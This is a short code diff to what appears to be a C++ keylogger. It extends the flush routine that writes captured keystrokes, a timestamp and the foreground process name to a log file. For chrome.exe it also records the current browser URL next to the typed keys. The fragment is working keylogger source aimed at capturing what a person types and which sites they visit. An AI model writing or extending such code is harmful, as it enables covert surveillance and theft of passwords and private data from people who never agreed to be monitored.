@@ -1,4 +1,6 @@
 #include "keyboard.h"
+#include <map>
+#include "../url/url.h"
 
 std::string int_to_hex(int n)
 {
@@ -97,14 +99,26 @@ void flush(){
     if (myfile.is_open())
     {
         std::time_t logTime = system_clock::to_time_t(system_clock::now());
-        myfile << std::ctime(&logTime) << "> ";
+        myfile << std::ctime(&logTime) << "\n";
 
-        myfile << getProcName(getCurrentPID()) << ": ";
+        std::string procName = getProcName(getCurrentPID());
+        myfile << procName << ": ";
 
         for (int i = 0; i < keyBuffer.size(); i++)
         {
             myfile << keyBuffer.at(i) << ' ';
+            if (i == keyBuffer.size() - 1)
+            {
+                myfile << '\n';
+            }
         }
+
+        if (procName == "chrome.exe"){
+            std::string url{};
+            getChromeUrl(url);
+            myfile << "URL > " << url << '\n';   
+        }
+
 
         myfile << '\n';
 
